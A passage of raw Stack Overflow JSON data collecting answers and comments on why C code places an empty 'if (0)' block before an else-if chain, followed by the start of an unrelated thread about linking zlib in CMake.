SQL, I've seen libraries emit the following <code>where</code> clause.</p>\n\n<pre><code>where 1 = 1\n</code></pre>\n\n<p>This presumably makes it easier to just add on other criteria, because all additional criteria can be prepended with <code>and</code> instead of an additional check to see if it is the first criteria or not.</p>\n"}, {"tags": [], "owner": {"reputation": 2597, "user_id": 1389218, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/XZKfz.png?s=128&g=1", "display_name": "John U", "link": "https://stackoverflow.com/users/1389218/john-u"}, "is_accepted": false, "score": -2, "last_activity_date": 1542218118, "creation_date": 1542218118, "answer_id": 53306175, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53306175#53306175", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>I have seen this a few times, I think the most likely reason is it was evaluating something in an older/different version/branch of the code, or possibly for debugging, and changing it to <code>if(0)</code> is a somewhat lazy way of removing whatever was there.</p>\n"}, {"comments": [{"owner": {"reputation": 9506, "user_id": 1804013, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/8610355e1a0c6d9e42619ed9ac4636af?s=128&d=identicon&r=PG", "display_name": "tfont", "link": "https://stackoverflow.com/users/1804013/tfont"}, "edited": false, "score": 2, "creation_date": 1542986303, "post_id": 53307187, "comment_id": 93771021, "body": "Nailed it. I couldn&#39;t see any other reason beside debugging."}], "tags": [], "owner": {"reputation": 16641, "user_id": 374746, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/659060fcfde804c6582d87b432dfa497?s=128&d=identicon&r=PG", "display_name": "Russell Borogove", "link": "https://stackoverflow.com/users/374746/russell-borogove"}, "is_accepted": false, "score": 44, "last_activity_date": 1542222563, "creation_date": 1542222563, "answer_id": 53307187, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53307187#53307187", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>As written, the <code>if (0) {}</code> clause compiles out to nothing.</p>\n\n<p>I suspect the function of the clause at the top of this ladder is to provide an easy place to temporarily disable all the other functionality at once (for debugging or comparison purposes) by changing the <code>0</code> to a <code>1</code> or <code>true</code>. </p>\n"}, {"comments": [{"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 5, "creation_date": 1542227464, "post_id": 53308090, "comment_id": 93497273, "body": "In many cases, an <code>if</code>/<code>else if</code> chain isn&#39;t used so much as a decision tree, but rather as an &quot;act upon first matching condition&quot; construct, where the condition that happens to have the highest-priority isn&#39;t particularly &quot;special&quot;.  While I&#39;d not seen <code>if(0)</code> used as a way to allow all real branches to have consistent syntax, I like the consistent syntax it facilitates."}, {"owner": {"reputation": 480272, "user_id": 1968, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/fdd630f72eef3790bfb4ef38d08c7f85?s=128&d=identicon&r=PG", "display_name": "Konrad Rudolph", "link": "https://stackoverflow.com/users/1968/konrad-rudolph"}, "edited": false, "score": 1, "creation_date": 1542275378, "post_id": 53308090, "comment_id": 93513353, "body": "It\u2019s not even useful in this case because you can achieve the same effect without: just split the <code>else if</code> line into two and put the preprocessor guard in between."}, {"owner": {"reputation": 101, "user_id": 9135007, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/363c5f8bac9e2c26e014b573f505741c?s=128&d=identicon&r=PG&f=1", "display_name": "JiK", "link": "https://stackoverflow.com/users/9135007/jik"}, "reply_to_user": {"reputation": 480272, "user_id": 1968, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/fdd630f72eef3790bfb4ef38d08c7f85?s=128&d=identicon&r=PG", "display_name": "Konrad Rudolph", "link": "https://stackoverflow.com/users/1968/konrad-rudolph"}, "edited": false, "score": 1, "creation_date": 1542302383, "post_id": 53308090, "comment_id": 93529965, "body": "@KonradRudolph I&#39;m not following; how would you write it?"}, {"owner": {"reputation": 480272, "user_id": 1968, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/fdd630f72eef3790bfb4ef38d08c7f85?s=128&d=identicon&r=PG", "display_name": "Konrad Rudolph", "link": "https://stackoverflow.com/users/1968/konrad-rudolph"}, "reply_to_user": {"reputation": 101, "user_id": 9135007, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/363c5f8bac9e2c26e014b573f505741c?s=128&d=identicon&r=PG&f=1", "display_name": "JiK", "link": "https://stackoverflow.com/users/9135007/jik"}, "edited": false, "score": 1, "creation_date": 1542304466, "post_id": 53308090, "comment_id": 93531051, "body": "@JiK I\u2019d remove the <code>if (0)</code> branch and reformat the rest such that <code>else</code> is on its own line, surrounded by a guard along the lines of <code>#if TEST1_ENABLED &amp;&amp; TEST2_ENABLED</code>."}, {"owner": {"reputation": 185743, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "reply_to_user": {"reputation": 480272, "user_id": 1968, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/fdd630f72eef3790bfb4ef38d08c7f85?s=128&d=identicon&r=PG", "display_name": "Konrad Rudolph", "link": "https://stackoverflow.com/users/1968/konrad-rudolph"}, "edited": false, "score": 5, "creation_date": 1542321523, "post_id": 53308090, "comment_id": 93538199, "body": "@KonradRudolph that&#39;s fine if you want to double the number of guards and triple the number of guard conditions mentioned, I suppose."}, {"owner": {"reputation": 101, "user_id": 9135007, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/363c5f8bac9e2c26e014b573f505741c?s=128&d=identicon&r=PG&f=1", "display_name": "JiK", "link": "https://stackoverflow.com/users/9135007/jik"}, "reply_to_user": {"reputation": 480272, "user_id": 1968, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/fdd630f72eef3790bfb4ef38d08c7f85?s=128&d=identicon&r=PG", "display_name": "Konrad Rudolph", "link": "https://stackoverflow.com/users/1968/konrad-rudolph"}, "edited": false, "score": 0, "creation_date": 1542357756, "post_id": 53308090, "comment_id": 93547645, "body": "@KonradRudolph And if there&#39;s 4 different branches, how would you write the else between the 3rd and 4th branch? <code>#if (TEST1_ENABLED || TEST2_ENABLED || TEST3_ENABLED) &amp;&amp; TEST4_ENABLED</code>?"}, {"owner": {"reputation": 480272, "user_id": 1968, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/fdd630f72eef3790bfb4ef38d08c7f85?s=128&d=identicon&r=PG", "display_name": "Konrad Rudolph", "link": "https://stackoverflow.com/users/1968/konrad-rudolph"}, "reply_to_user": {"reputation": 101, "user_id": 9135007, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/363c5f8bac9e2c26e014b573f505741c?s=128&d=identicon&r=PG&f=1", "display_name": "JiK", "link": "https://stackoverflow.com/users/9135007/jik"}, "edited": false, "score": 0, "creation_date": 1542362074, "post_id": 53308090, "comment_id": 93549644, "body": "@JiK In that case you should start asking yourself seriously WTF you\u2019re doing. The proper fix is to structure the code better, not to add a fake <code>if</code> guard at the top."}], "tags": [], "owner": {"reputation": 1242, "user_id": 1663651, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0c9c83d1310abeec7d77017f9682c1d4?s=128&d=identicon&r=PG", "display_name": "CSM", "link": "https://stackoverflow.com/users/1663651/csm"}, "is_accepted": false, "score": 106, "last_activity_date": 1542226470, "creation_date": 1542226470, "answer_id": 53308090, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53308090#53308090", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>This can be useful if there are <code>#if</code> statements, ala</p>\n\n<pre><code>   if (0)\n   {\n       // Empty block\n   }\n#if TEST1_ENABLED\n   else if (test1())\n   {\n      action1();\n   }\n#endif\n#if TEST2_ENABLED\n   else if (test2())\n   {\n      action2();\n   }\n#endif\n</code></pre>\n\n<p>etc.</p>\n\n<p>In this case, any (and all) of the tests can be <code>#if</code>'ed out, and the code will compile correctly. Almost all compilers will remove the <code>if (0) {}</code> part.\nA simple autogenerator could generate code like this, as it is slightly easier to code - it doesn't have to consider the first enabled block separately.</p>\n"}, {"comments": [{"owner": {"reputation": 1413, "user_id": 1766364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dNwBh.png?s=128&g=1", "display_name": "Zzaponka", "link": "https://stackoverflow.com/users/1766364/zzaponka"}, "edited": false, "score": 1, "creation_date": 1542278042, "post_id": 53312155, "comment_id": 93514910, "body": "I agree, in the age of ubiquitous automation we should rely on autogenerated code more, as it allows us to spend more time on actual things. But for now, my exact point of interest is how this everything is architectured under the hood."}], "tags": [], "owner": {"reputation": 303, "user_id": 471663, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1aa4841233d67c7281d5f6909583519a?s=128&d=identicon&r=PG", "display_name": "simonarame", "link": "https://stackoverflow.com/users/471663/simonarame"}, "is_accepted": false, "score": 9, "last_activity_date": 1542253746, "creation_date": 1542253746, "answer_id": 53312155, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53312155#53312155", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>I've seen non reachable code blocks in pre-expanded JavaScript that have been generated using a templating language.</p>\n\n<p>For instance, the code you are reading could have been pasted from a server that pre-evaluated the first condition that at that time relied on a variable only available on server side.</p>\n\n<pre><code>if ( ${requestIsNotHttps} ){ ... }else if( ...\n</code></pre>\n\n<p>which once pre-compiled hences : </p>\n\n<pre><code>if ( 0 ){ ... }else if ( ...\n</code></pre>\n\n<p>hope this helps you relativise the potential low keyboard activity of the pro-recycling coders era for which i manifest enthusiasm !</p>\n"}, {"comments": [{"owner": {"reputation": 888, "user_id": 344661, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/8ef0e5b4a80cef441275a6330ffad77d?s=128&d=identicon&r=PG", "display_name": "Julie in Austin", "link": "https://stackoverflow.com/users/344661/julie-in-austin"}, "edited": false, "score": 2, "creation_date": 1561679977, "post_id": 53322223, "comment_id": 100153913, "body": "Yup. For ancient code, make one dead-code-removing change at a time. I can&#39;t count the number of times I&#39;ve gone on a slash-and-burn rampage against &quot;dead&quot; code only to discover there was some bizarre side-effect that slashing-and-burning missed."}], "tags": [], "owner": {"reputation": 325, "user_id": 6882231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4d3b90aec2249238e8f6c8ff7df66ee2?s=128&d=identicon&r=PG&f=1", "display_name": "Dark Matter ", "link": "https://stackoverflow.com/users/6882231/dark-matter"}, "is_accepted": false, "score": 15, "last_activity_date": 1542293961, "creation_date": 1542293961, "answer_id": 53322223, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53322223#53322223", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p><strong>It's code rot.</strong>  </p>\n\n<p>At some point that \"if\" did something useful, the situation changed, maybe the variable being evaluated was removed.  </p>\n\n<p>The person who was fixing/changing the system did <strong>as little as possible to affect the logic of the system</strong> so he just made sure the code would recompile.  So he leaves an \"if(0)\" because that's quick and easy and he's not totally sure that's what he wants to do.   He gets the system working and he doesn't go back to fix it completely.  </p>\n\n<p><strong>Then the next developer comes along and thinks that was done deliberately</strong> and only comments out that part of the code (since it's not being evaluated anyway), then the next time the code is touched those comments are removed.</p>\n"}, {"tags": [], "owner": {"reputation": 595, "user_id": 1352761, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/88d413834375dbc71f5d3146aca1cd3c?s=128&d=identicon&r=PG", "display_name": "studog", "link": "https://stackoverflow.com/users/1352761/studog"}, "is_accepted": false, "score": 15, "last_activity_date": 1542309584, "creation_date": 1542309584, "answer_id": 53326538, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53326538#53326538", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>One possibility not yet mentioned: the <code>if (0) {</code> line could be providing a convenient spot for a breakpoint.</p>\n\n<p>Debugging is often done on non-optimised code so the always-false test will be present and able to have breakpoint set on it. When compiled for production, the line of code would be optimised out. The seemingly useless line gives functionality for development and testing builds without impacting release builds.</p>\n\n<p>There are other good suggestions above as well; the only way to really know what the purpose is, is to track down the author and ask. Your source code control system might help with that. (Look for <code>blame</code>-type functionality.)</p>\n"}, {"tags": [], "owner": {"reputation": 1238, "user_id": 320267, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/837024f9facfc465dba927baad0c09ec?s=128&d=identicon&r=PG", "display_name": "philfr", "link": "https://stackoverflow.com/users/320267/philfr"}, "is_accepted": false, "score": 8, "last_activity_date": 1542743595, "creation_date": 1542743595, "answer_id": 53400577, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53400577#53400577", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>That construct may also be used in C to implement generic programming with type safety, relying on the fact that the unreachable code is still checked by the compiler:</p>\n\n<pre><code>// this is a generic unsafe function, that will call fun(arg) at a later time\nvoid defer(void *fun, void *arg);\n\n// this is a macro that makes it safer, by checking the argument\n// matches the function signature\n#define DEFER(f, arg) \\\n   if(0) f(arg); \\              // never actually called, but compile-time checked\n   else defer(f, (void *)arg);  // do the unsafe call after safety check\n\nvoid myfunction(int *p);\n\nDEFER(myfunction, 42);     // compile error\nint *b;\nDEFER(myfunction, b);      // compiles OK\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 13, "user_id": 8915063, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-BwRULKKzj-4/AAAAAAAAAAI/AAAAAAAAAC8/08U7yNHxjUM/photo.jpg?sz=128", "display_name": "Abdul Ahad Sheikh", "link": "https://stackoverflow.com/users/8915063/abdul-ahad-sheikh"}, "is_accepted": false, "score": 1, "last_activity_date": 1542780432, "creation_date": 1542780432, "answer_id": 53406149, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53406149#53406149", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>It helps to debug this block just putting if block 1. This disable all if else block functionality. And also we can expand the if else block.  </p>\n"}, {"tags": [], "owner": {"reputation": 6410, "user_id": 1051115, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b37fdf7928b7aecd15a973b250979333?s=128&d=identicon&r=PG", "display_name": "Krazy Glew", "link": "https://stackoverflow.com/users/1051115/krazy-glew"}, "is_accepted": false, "score": 1, "last_activity_date": 1544905362, "last_edit_date": 1544905362, "creation_date": 1543460275, "answer_id": 53531188, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53531188#53531188", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>@PSkocik's answer is fine, but I add my two cents.  Unsure if I should do this as a comment, or as an answer; choosing the latter, because IMHO worth others seeing, whereas comments are frequently invisible.</p>\n\n<p>Not only do I occasionally use </p>\n\n<pre><code>if(0) {\n   //deliberately left empty\n} else if( cond1 ) {\n   //deliberately left empty\n} else if( cond2 ) {\n   //deliberately left empty\n...\n} else {\n   // no conditions matched\n}\n</code></pre>\n\n<p>But I also occasionally do</p>\n\n<pre><code>if( 1 \n    &amp;&amp; cond1 \n    &amp;&amp; cond2\n    ...\n    &amp;&amp; condN\n) {\n</code></pre>\n\n<p>or</p>\n\n<pre><code>if( 0 \n    || cond1 \n    || cond2\n    ...\n    || condN\n) {\n</code></pre>\n\n<p>for complicated conditions.  For the same reasons - easier to edit, #ifdef, etc.</p>\n\n<p>For that matter, in Perl I will do</p>\n\n<pre><code>@array = (  \n    elem1,\n    elem2,\n    ...\n    elem1,\n) {\n</code></pre>\n\n<ul>\n<li>note the comma at the end of the list. I forget if commas are separators or delimiters in C and C++ lists. IMHO this is one thing we have learned:  [<a href=\"https://stackoverflow.com/questions/23748548/are-trailing-commas-in-perl-a-bad-practice][trailing\">Are trailing commas in Perl a bad practice?</a> commas] are a good thing.  Like any new notation, it takes a while to get used to.</li>\n</ul>\n\n<p>I compare the <code>if(0)</code> code to lisp </p>\n\n<pre><code>(cond   (test1    action1)\n   (test2    action2)\n   ...\n   (testn   actionn))\n</code></pre>\n\n<p>which, you guessed it, I may indent as </p>\n\n<pre><code>(cond   \n   (test1    action1)\n   (test2    action2)\n   ...\n   (testn   actionn)\n)\n</code></pre>\n\n<p>I have sometimes tried to imagine what a more human readable syntax for this might look like.</p>\n\n<p>Perhaps</p>\n\n<pre><code>IF\n:: cond1 THEN code1\n:: cond2 THEN code2\n...\n:: condN THEN codeN\nFI\n</code></pre>\n\n<p>inspired by Dikstra's [<a href=\"https://en.wikipedia.org/wiki/Guarded_Command_Language#Selection:_if][Guarded\" rel=\"nofollow noreferrer\">https://en.wikipedia.org/wiki/Guarded_Command_Language#Selection:_if][Guarded</a> Command Language].</p>\n\n<p>But this syntax implies that the conditions are evaluated in parallel, whereas <code>if...else-if</code> implies sequential and prioritized evaluation of conditions.</p>\n\n<p>I started doing this sort of thing when writing programs that generated other programs, where it is especially convenient. </p>\n\n<p>While we are at it, when writing RTL using Intel's old iHDL, I have coded stuff like</p>\n\n<pre><code>   IF 0 THEN /*nothing*/\n   **FORC i FROM 1 TO 10 DOC** \n   ELSE IF signal%i% THEN    \n      // stuff to do if signal%i% is active\n   **ENDC** \n   ELSE   \n      // nothing matched \n   ENDIF\n</code></pre>\n\n<p>where the <code>FORC..DOC..ENDC</code> is a macro preprocessor loop construct, that expands to  </p>\n\n<pre><code>   IF 0 THEN /*nothing*/\n   ELSE IF signal1 THEN    \n      // stuff to do if signal1 is active\n   ELSE IF signal2 THEN    \n      // stuff to do if signal2 is active\n   ...\n   ELSE IF signal100 THEN    \n      // stuff to do if signal100 is active\n   ELSE   \n      // nothing matched \n   ENDIF\n</code></pre>\n\n<p>This was single assignment, non-imperative, code, so setting a state variable was not allowed, if you needed to do things like find first set bit.</p>\n\n<pre><code>   IF 0 THEN /*nothing*/\n   ELSE IF signal1 THEN    \n      found := 1\n   ELSE IF signal2 THEN    \n      found := 2\n   ...\n   ELSE IF signal100 THEN    \n      found := 100\n   ELSE   \n      // nothing matched \n   ENDIF\n</code></pre>\n\n<p>Come to think of it, this may have been the first place that I encountered such constructs.</p>\n\n<p>BTW, the objections that some had to the if(0) style - that the else-if-conditions are sequentially dependent and cannot be arbitrarily reordered - do not apply to AND and OR and XOR logic in RTL - but do apply to short-circuit &amp;&amp; and ||.</p>\n"}, {"tags": [], "owner": {"reputation": 21, "user_id": 10742779, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-HP6ZmZhiHOM/AAAAAAAAAAI/AAAAAAAAGKo/EEg0Lm0GtVM/photo.jpg?sz=128", "display_name": "Sagar Kumar Choudhury", "link": "https://stackoverflow.com/users/10742779/sagar-kumar-choudhury"}, "is_accepted": false, "score": 1, "last_activity_date": 1543910797, "creation_date": 1543910797, "answer_id": 53608302, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/53608302#53608302", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<pre><code>    Actually according to my opinion, if we put any variable for checking inside\n    e.g:-\npublic static void main(string args[])\n{\n        var status;\n        var empList=_unitofWork.EmpRepository.Get(con=&gt;con.isRetired==true);\n        //some code logic \n        if(empList.count&gt;0)\n        {\n          status=true;\n        }\n        if(status)\n        {\n         //do something\n        }\n        else\n        {\n        //do something else\n        }\n}\n     if then its dynamically get the value in run time and invoke the logic inside it, else its simply extra line of code i guess.\n\n    Anybody have any depth knowledge why this thing is used....or agree with me.\n    kindly respond. \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 12372441, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-RSusDCnWrfc/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdQAENupmvHDABDvMoYPfpZYomkzQ/photo.jpg?sz=128", "display_name": "Jayachandra M", "link": "https://stackoverflow.com/users/12372441/jayachandra-m"}, "is_accepted": false, "score": -1, "last_activity_date": 1574322372, "last_edit_date": 1574322372, "creation_date": 1574321970, "answer_id": 58969633, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block/58969633#58969633", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>I have seen this used to handle errors, for example</p>\n\n<pre><code>if(0){\nlable1:\n   //do something\n}\nif(0){\nlable2:\n   //do something\n}\n.\n.\nand so on.\n\nif(condition_fails)\n   goto lable1;\n</code></pre>\n\n<p>This can be helpful when goto is used to manage errors, statements are executed only when an error occurs. I saw this in very old C-code(where function arguments are written outside the '()' ), don't think anyone follows this now.</p>\n"}], "owner": {"reputation": 1413, "user_id": 1766364, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dNwBh.png?s=128&g=1", "display_name": "Zzaponka", "link": "https://stackoverflow.com/users/1766364/zzaponka"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 14266, "favorite_count": 8, "accepted_answer_id": 53298823, "answer_count": 16, "score": 142, "last_activity_date": 1574322372, "creation_date": 1542193217, "last_edit_date": 1542204252, "question_id": 53298646, "link": "https://stackoverflow.com/questions/53298646/what-is-the-purpose-of-an-if-0-block-in-if-else-block", "title": "What is the purpose of an &#39;if (0)&#39; block in if-else block?", "body": "<p>My question is about the line I have mentioned in the subject and which I can see in many places inside the production code.</p>\n\n<p>The overall code looks like this:</p>\n\n<pre><code>if (0) {\n    // Empty braces\n} else if (some_fn_call()) {\n    // actual code\n} else if (some_other_fn_call()) {\n    // another actual code\n    ...\n} else {\n    // default case\n}\n</code></pre>\n\n<p>The other branches are irrelevant to my question. I'm wondering what the meaning of putting <code>if (0)</code> here is. The braces are empty, so I don't think that it is supposed to comment some block of code. Does it force the compiler to make some optimization or are its intentions different?</p>\n\n<p>I have tried to search for this explicit case here on SO and on the internet, but with no success. There're similar questions about JavaScript, but not C. There's another question, <a href=\"https://stackoverflow.com/questions/17540692/what-happens-when-a-zero-is-assigned-in-an-if-condition\">What happens when a zero is assigned in an `if` condition?</a>, but it discusses zero assignment to a variable, not the 'if (0)' usage itself.</p>\n"}, {"tags": ["c", "cmake", "gzip", "zlib"], "comments": [{"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542192959, "post_id": 53298492, "comment_id": 93477838, "body": "Have you compiled zlib? Where is libzlib.so or similar?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1542192965, "post_id": 53298492, "comment_id": 93477844, "body": "You don&#39;t build with the zlib source file, or link with the zlib library."}, {"owner": {"reputation": 578, "user_id": 3831854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ef3744308021ae1eda4e17cbce490e?s=128&d=identicon&r=PG&f=1", "display_name": "AKJ", "link": "https://stackoverflow.com/users/3831854/akj"}, "edited": false, "score": 0, "creation_date": 1542193043, "post_id": 53298492, "comment_id": 93477895, "body": "How to compile zlib?"}, {"owner": {"reputation": 19856, "user_id": 2266772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60e03bd1fd9f2dbc750e0899b9e7e71d?s=128&d=identicon&r=PG", "display_name": "Matthieu Brucher", "link": "https://stackoverflow.com/users/2266772/matthieu-brucher"}, "edited": false, "score": 0, "creation_date": 1542193146, "post_id": 53298492, "comment_id": 93477940, "body": "You have doanloaded a package, there is a README in it with the instructions on how to build it on all platforms. You can also directly get a prebuilt package."}, {"owner": {"reputation": 578, "user_id": 3831854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ef3744308021ae1eda4e17cbce490e?s=128&d=identicon&r=PG&f=1", "display_name": "AKJ", "link": "https://stackoverflow.com/users/3831854/akj"}, "edited": false, "score": 0, "creation_date": 1542194582, "post_id": 53298492, "comment_id": 93478815, "body": "Matthieu, the readme:  # To install libz.a, zconf.h and zlib.h in the system directories, type: # #   make install -fwin32/Makefile.gcc."}], "answers": [{"comments": [{"owner": {"reputation": 578, "user_id": 3831854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ef3744308021ae1eda4e17cbce490e?s=128&d=identicon&r=PG&f=1", "display_name": "AKJ", "link": "https://stackoverflow.com/users/3831854/akj"}, "edited": false, "score": 1, "creation_date": 1542193164, "post_id": 53298568, "comment_id": 93477953, "body": "Should i replace ${ZLIB_LIBRARIES} with something? I get : CMake Error at CMakeLists.txt:9 (target_link_library):   Unknown CMake command &quot;target_link_library&quot;."}, {"owner": {"reputation": 19856, "user_id": 2266772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60e03bd1fd9f2dbc750e0899b9e7e71d?s=128&d=identicon&r=PG", "display_name": "Matthieu Brucher", "link": "https://stackoverflow.com/users/2266772/matthieu-brucher"}, "reply_to_user": {"reputation": 578, "user_id": 3831854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ef3744308021ae1eda4e17cbce490e?s=128&d=identicon&r=PG&f=1", "display_name": "AKJ", "link": "https://stackoverflow.com/users/3831854/akj"}, "edited": false, "score": 0, "creation_date": 1542193230, "post_id": 53298568, "comment_id": 93477992, "body": "That&#39;s assuming that you have the package built, and that you are setting the paths to find zlib for cmake properly. And yes, fixed a type, should be librarIES, not librarY."}, {"owner": {"reputation": 1968, "user_id": 846641, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/q1FW7.jpg?s=128&g=1", "display_name": "Philipp", "link": "https://stackoverflow.com/users/846641/philipp"}, "reply_to_user": {"reputation": 578, "user_id": 3831854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ef3744308021ae1eda4e17cbce490e?s=128&d=identicon&r=PG&f=1", "display_name": "AKJ", "link": "https://stackoverflow.com/users/3831854/akj"}, "edited": false, "score": 0, "creation_date": 1542193275, "post_id": 53298568, "comment_id": 93478018, "body": "@AKJ which version of cmake are you using?"}, {"owner": {"reputation": 578, "user_id": 3831854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ef3744308021ae1eda4e17cbce490e?s=128&d=identicon&r=PG&f=1", "display_name": "AKJ", "link": "https://stackoverflow.com/users/3831854/akj"}, "edited": false, "score": 0, "creation_date": 1542193373, "post_id": 53298568, "comment_id": 93478075, "body": "I am really a noob at this. Can you please instruct me on what to do?"}, {"owner": {"reputation": 19856, "user_id": 2266772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60e03bd1fd9f2dbc750e0899b9e7e71d?s=128&d=identicon&r=PG", "display_name": "Matthieu Brucher", "link": "https://stackoverflow.com/users/2266772/matthieu-brucher"}, "edited": false, "score": 0, "creation_date": 1542193448, "post_id": 53298568, "comment_id": 93478117, "body": "in the cmake-gui (or ccmake on Linux, but in that case, you should already have a zlib package with the system), you need to fill the path to zlib as the errors that find_package indicates."}, {"owner": {"reputation": 578, "user_id": 3831854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ef3744308021ae1eda4e17cbce490e?s=128&d=identicon&r=PG&f=1", "display_name": "AKJ", "link": "https://stackoverflow.com/users/3831854/akj"}, "edited": false, "score": 0, "creation_date": 1542194254, "post_id": 53298568, "comment_id": 93478634, "body": "Philipp, i am using Cmake 3.10.2"}, {"owner": {"reputation": 7756, "user_id": 1329844, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/0afe030a3ea58a861f1717f80e703d08?s=128&d=identicon&r=PG", "display_name": "Michael Schlottke-Lakemper", "link": "https://stackoverflow.com/users/1329844/michael-schlottke-lakemper"}, "reply_to_user": {"reputation": 578, "user_id": 3831854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ef3744308021ae1eda4e17cbce490e?s=128&d=identicon&r=PG&f=1", "display_name": "AKJ", "link": "https://stackoverflow.com/users/3831854/akj"}, "edited": false, "score": 0, "creation_date": 1564468419, "post_id": 53298568, "comment_id": 101029854, "body": "@AKJ You need to use <code>target_link_libraries</code>, not <code>target_link_library</code> (note the plural form)."}, {"owner": {"reputation": 578, "user_id": 3831854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01ef3744308021ae1eda4e17cbce490e?s=128&d=identicon&r=PG&f=1", "display_name": "AKJ", "link": "https://stackoverflow.com/users/3831854/akj"}, "reply_to_user": {"reputation": 7756, "user_id": 1329844, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/0afe030a3ea58a861f1717f80e703d08?s=128&d=identicon&r=PG", "display_name": "Michael Schlottke-Lakemper", "link": "https://stackoverflow.com/users/1329844/michael-schlottke-lakemper"}, 